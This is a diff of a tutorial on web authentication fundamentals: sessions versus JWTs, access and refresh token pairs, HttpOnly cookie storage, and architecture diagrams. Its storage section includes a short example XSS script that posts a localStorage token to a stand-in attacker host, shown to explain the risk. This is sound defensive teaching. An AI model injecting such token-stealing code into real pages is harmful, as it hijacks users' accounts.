@@ -1,126 +1,224 @@
-# M0: Authentication Foundations
+# M0: Authentication Foundations — The Complete Mental Model
 
-Before writing a single line of code, you must understand *why* the code exists. Authentication is not just "logging in" — it is a series of state management problems solved over HTTP.
+**Track:** Core Curriculum  
+**Prerequisites:** None — Start here.  
+**Time:** ~1 hour  
+
+---
+
+## Why This Document Exists
+
+Every experienced engineer has seen codebases where authentication was bolted on as an afterthought. Tokens stored in `localStorage`. Sessions that never expire. Role checks done only on the frontend. These are not "beginner mistakes" — they are the result of learning *how* to do authentication without learning *why*.
+
+This milestone gives you the *why*. Every design decision in this codebase flows directly from the principles in this document.
 
 ---
 
 ## 1. Authentication vs Authorization
 
-The most common mistake junior developers make is confusing these two.
+These terms are used interchangeably in casual conversation. They mean completely different things.
 
-- **Authentication (AuthN)**: Proving *who* you are.
-  - "I am Tauhid. Here is my password to prove it."
-- **Authorization (AuthZ)**: Checking *what* you are allowed to do.
-  - "Tauhid is logged in, but does he have the `ADMIN` role to delete this user?"
+| Term | Question Answered | Example |
+|------|-----------------|---------|
+| **Authentication (AuthN)** | Who are you? | "I am Tauhid. Here is my password." |
+| **Authorization (AuthZ)** | What can you do? | "Tauhid is logged in. Is he allowed to delete this user?" |
 
-*Analogy: Authentication is getting your passport checked at the border. Authorization is whether your visa allows you to work or just visit.*
+**The critical insight:** Authorization requires Authentication first. You cannot check what someone is allowed to do until you know who they are.
+
+*Analogy: At an airport, the passport check is Authentication. The boarding pass check at the gate is Authorization (you can't board flight AA123 even with a valid passport if you don't have a ticket for that specific flight).*
 
 ---
 
 ## 2. The HTTP Stateless Problem
 
-HTTP is a stateless protocol.
-When you log in successfully, the server sends a response: `200 OK`.
-If you immediately make another request to `/dashboard`, the server has no memory of the previous request. It says: `401 Unauthorized`.
+HTTP is a stateless protocol. Each HTTP request is completely independent. The server has zero memory of previous requests from the same client.
 
-**The Solution:** You must send proof of your identity with *every single request*.
+When you log in:
+```http
+POST /api/auth/login
+{ "email": "tauhid@example.com", "password": "..." }
 
-There are two primary ways to carry this proof:
-1. **Sessions (Stateful)**
-2. **Tokens (Stateless - JWT)**
-
----
-
-## 3. Stateful Sessions vs Stateless Tokens
-
-### Stateful Sessions (The Old Way)
-1. User logs in.
-2. Server creates a session record in the Database (or Redis) with ID `xyz123`.
-3. Server gives the browser a cookie containing `xyz123`.
-4. On every request, browser sends cookie `xyz123`.
-5. Server looks up `xyz123` in the Database to find the user.
-
-*Pros:* Easy to revoke (just delete the DB row).
-*Cons:* Server must query the DB on *every single request*. Hard to scale across many servers.
-
-### Stateless Tokens (The Modern SaaS Way — JWT)
-1. User logs in.
-2. Server generates a JSON Web Token (JWT) containing the user's ID, signed with a secret key.
-3. Server gives the browser the JWT.
-4. On every request, browser sends the JWT.
-5. Server verifies the signature mathematically. **No DB lookup required.**
-
-*Pros:* Extremely fast, highly scalable.
-*Cons:* Cannot be revoked before they expire. If a hacker steals the token, they have access until the token's expiration time.
-
----
-
-## 4. The Token Pair Architecture (What we are building)
-
-To solve the "cannot be revoked" problem of JWTs, modern systems (Stripe, GitHub, our system) use a Token Pair:
-
-### 1. Access Token (JWT)
-- **Lifespan**: Very short (5 minutes).
-- **Storage**: Memory or HTTP-only Cookie.
-- **Purpose**: Sent with every API request to access protected data.
-- **Why short?** If stolen, the hacker only has 5 minutes.
-
-### 2. Refresh Token (Opaque String or JWT)
-- **Lifespan**: Long (30 days).
-- **Storage**: Database (and HTTP-only Cookie).
-- **Purpose**: Used ONLY to get a new Access Token when the old one expires.
-- **Why in the DB?** Because it lasts 30 days, we *must* be able to revoke it. If a user clicks "Log out everywhere", we delete this token from the DB.
-
-### The Flow
-1. API request fails with `401 Expired`.
-2. Frontend silently sends Refresh Token to `/api/auth/refresh`.
-3. Backend checks DB: "Is this refresh token valid and not revoked?"
-4. Backend issues a NEW 5-minute Access Token.
-5. Frontend retries the original API request.
-*(The user never notices this happened).*
-
----
-
-## 5. Security: Where to store tokens?
-
-**NEVER STORE TOKENS IN `localStorage`.**
-If your site has a Cross-Site Scripting (XSS) vulnerability (e.g., someone injects malicious JavaScript into a comment), that JavaScript can run `localStorage.getItem('token')` and send your token to a hacker.
-
-**ALWAYS USE `HTTP-Only` COOKIES.**
-An `HttpOnly` cookie cannot be read by JavaScript. Even if an attacker executes code on your site, they cannot steal the token. The browser automatically attaches the cookie to requests sent to your API.
-
----
-
-## 6. Real-World Architecture Diagram
-
-```ascii
-Browser                          Next.js (Web)                   Express (API)
-   │                                  │                               │
-   │ 1. User enters credentials       │                               │
-   ├─────────────────────────────────►│                               │
-   │                                  │ 2. POST /api/auth/login       │
-   │                                  ├──────────────────────────────►│
-   │                                  │                               │ Verify Password
-   │                                  │                               │ Generate JWT (5m)
-   │                                  │                               │ Save Refresh Token to DB (30d)
-   │                                  │                               │
-   │                                  │ 3. Set-Cookie (HttpOnly)      │
-   │                                  │◄──────────────────────────────┤
-   │ 4. Redirect to /dashboard        │                               │
-   │◄─────────────────────────────────┤                               │
-   │                                  │                               │
-   │ 5. GET /dashboard                │                               │
-   ├─────────────────────────────────►│                               │
-   │                                  │ 6. GET /api/users/me (Cookie) │
-   │                                  ├──────────────────────────────►│
-   │                                  │                               │ Verify JWT signature
-   │                                  │ 7. Return User Data           │
-   │                                  │◄──────────────────────────────┤
-   │ 8. Render React Component        │                               │
-   │◄─────────────────────────────────┤                               │
+→ 200 OK ✅
 ```
 
-## Next Steps
+Immediately after, you make a request to a protected route:
+```http
+GET /api/users/me
 
-You now understand the theory.
-Proceed to **M1: MVP Auth** to implement the backend login and signup routes.
+→ 401 Unauthorized ❌ (The server has no idea who you are!)
+```
+
+**The fundamental problem of authentication in web applications is: how do we carry proof of identity across stateless HTTP requests?**
+
+There are two families of solutions.
+
+---
+
+## 3. Solution A: Stateful Sessions (The Traditional Way)
+
+1. User logs in. Server verifies password.
+2. Server creates a **Session Record** in the database: `{ id: "session_abc123", userId: "user_456", expiresAt: ... }`.
+3. Server sets a cookie in the browser: `session_id=session_abc123`.
+4. On every subsequent request, the browser sends the cookie automatically.
+5. The server looks up `session_abc123` in the database to find the user.
+
+### Pros
+- Easy to revoke: just delete the session record from the DB.
+- Session data can be large (you can store anything in the DB row).
+
+### Cons
+- **Database query on every request.** This is expensive at scale. A site with 100,000 concurrent users makes 100,000 extra DB queries per second just for authentication.
+- **Sticky sessions** or **session sharing** required when scaling to multiple servers. Server A's in-memory session doesn't exist on Server B.
+
+---
+
+## 4. Solution B: Stateless Tokens (The Modern SaaS Way)
+
+1. User logs in. Server verifies password.
+2. Server generates a **JSON Web Token (JWT)** — a signed JSON object containing the user's ID and role.
+3. Server gives the browser the JWT (in a cookie or response body).
+4. On every subsequent request, the browser sends the JWT.
+5. The server verifies the JWT's **cryptographic signature**. No DB lookup needed.
+
+### Pros
+- **Zero database queries for authentication.** Verification is pure math.
+- Stateless and horizontally scalable by nature. Any server with the same secret can verify any token.
+
+### Cons
+- **Cannot be revoked before expiry.** If a JWT is stolen and has a 24-hour lifetime, the attacker has 24 hours of unrevokable access.
+
+---
+
+## 5. The Token Pair Architecture (What We Build)
+
+To get the best of both worlds — stateless verification + the ability to revoke — modern systems use **two tokens working together**.
+
+### Access Token
+| Property | Value |
+|----------|-------|
+| Type | JWT (signed) |
+| Lifespan | **5 minutes** |
+| Storage | `HttpOnly` Cookie |
+| Purpose | Prove identity on every API request |
+| Revokable? | ❌ No (by design — its short life is the "revocation") |
+
+### Refresh Token
+| Property | Value |
+|----------|-------|
+| Type | Opaque random string (64 bytes) |
+| Lifespan | **30 days** |
+| Storage | Database (hashed) + `HttpOnly` Cookie |
+| Purpose | Only used to get a new Access Token |
+| Revokable? | ✅ Yes — just mark `isRevoked: true` in DB |
+
+### The Silent Refresh Flow
+```ascii
+Browser                     Express API                 Database
+   │                             │                          │
+   │  GET /api/users/me          │                          │
+   │  + access_token cookie      │                          │
+   ├────────────────────────────►│                          │
+   │                             │ jwt.verify() fails:      │
+   │  ← 401 TOKEN_EXPIRED        │ token is 5 min old       │
+   │                             │                          │
+   │  POST /api/auth/refresh     │                          │
+   │  + refresh_token cookie     │                          │
+   ├────────────────────────────►│                          │
+   │                             │ SELECT * FROM sessions   │
+   │                             ├─────────────────────────►│
+   │                             │ ← Session found, valid   │
+   │                             │                          │
+   │                             │ Rotate: mark old revoked │
+   │                             ├─────────────────────────►│
+   │  ← 200 + new access_token   │ INSERT new session row   │
+   │                             │                          │
+   │  GET /api/users/me (RETRY)  │                          │
+   │  + NEW access_token cookie  │                          │
+   ├────────────────────────────►│                          │
+   │  ← 200 User Data ✅         │                          │
+```
+
+The user sees none of this. Their app simply loads data normally.
+
+---
+
+## 6. Token Storage: The Golden Rule
+
+> [!CAUTION]
+> **NEVER store tokens in `localStorage` or `sessionStorage`.** 
+
+### Why localStorage is Dangerous
+`localStorage` is readable by any JavaScript code running on the page. If your site has even one Cross-Site Scripting (XSS) vulnerability — whether in your own code, a library you use, or a user-generated content field — an attacker can execute:
+
+```javascript
+// Malicious script injected via XSS
+fetch('https://attacker.example.com/collect', {
+  method: 'POST',
+  body: localStorage.getItem('access_token')
+});
+```
+
+Your token is gone. The attacker now has full access to your user's account.
+
+### Why HttpOnly Cookies are Safe
+```http
+Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax
+```
+
+- `HttpOnly`: JavaScript **cannot** read this cookie. `document.cookie` will not show it. DevTools Application tab will show it as `HttpOnly`. XSS attacks cannot steal it.
+- `Secure`: Only sent over HTTPS connections.
+- `SameSite=Lax`: Only sent on same-site requests and top-level navigation, blocking CSRF attacks from third-party sites.
+
+---
+
+## 7. The Real-World Architecture of This System
+
+```ascii
+┌──────────────────────────────────────────────────────────────────┐
+│                          BROWSER                                 │
+│                                                                  │
+│  React UI  ─────────────────────────────────  HttpOnly Cookie   │
+│  (reads user from memory/props)                (token vault)    │
+└──────────────────────────┬───────────────────────────────────────┘
+                           │ HTTP Requests (cookie auto-attached)
+                           ▼
+┌──────────────────────────────────────────────────────────────────┐
+│                       NEXT.JS SERVER                             │
+│                                                                  │
+│  Server Components ──── authFetchServer() ─── Cookie Forwarding │
+│  middleware.ts ─────────────────────────────── UX Routing       │
+└──────────────────────────┬───────────────────────────────────────┘
+                           │ HTTP Requests (cookie forwarded)
+                           ▼
+┌──────────────────────────────────────────────────────────────────┐
+│                       EXPRESS API                                │
+│                                                                  │
+│  authenticate middleware ──── jwt.verify() ──── No DB lookup    │
+│  requireRole middleware ────── req.user.role ── RBAC check      │
+│  auth routes ──────────────── bcrypt + JWT  ─── Token issuance  │
+└──────────────────────────┬───────────────────────────────────────┘
+                           │ Prisma ORM queries
+                           ▼
+┌──────────────────────────────────────────────────────────────────┐
+│                       POSTGRESQL DATABASE                        │
+│                                                                  │
+│  users table ─── (id, email, passwordHash, role)                │
+│  sessions table ─ (id, userId, tokenHash, isRevoked)            │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Practice Exercises
+
+1. **Explain it out loud:** Without looking at the document, explain the difference between an Access Token and a Refresh Token to an imaginary junior developer. Cover: lifespan, storage location, purpose, and revokeability.
+2. **Spot the vulnerability:** Review the following hypothetical code. Identify all the security problems:
+   ```javascript
+   const token = await loginUser(email, password);
+   localStorage.setItem("token", token); // Is this safe?
+   // Later...
+   fetch("/api/dashboard", {
+     headers: { Authorization: `Bearer ${localStorage.getItem("token")}` }
+   });
+   ```
+3. **Trace the architecture:** Open DevTools on any page of this app. Go to Application → Cookies. Confirm the token is `HttpOnly`. Then open the Console and run `document.cookie`. Verify the token is not visible there.
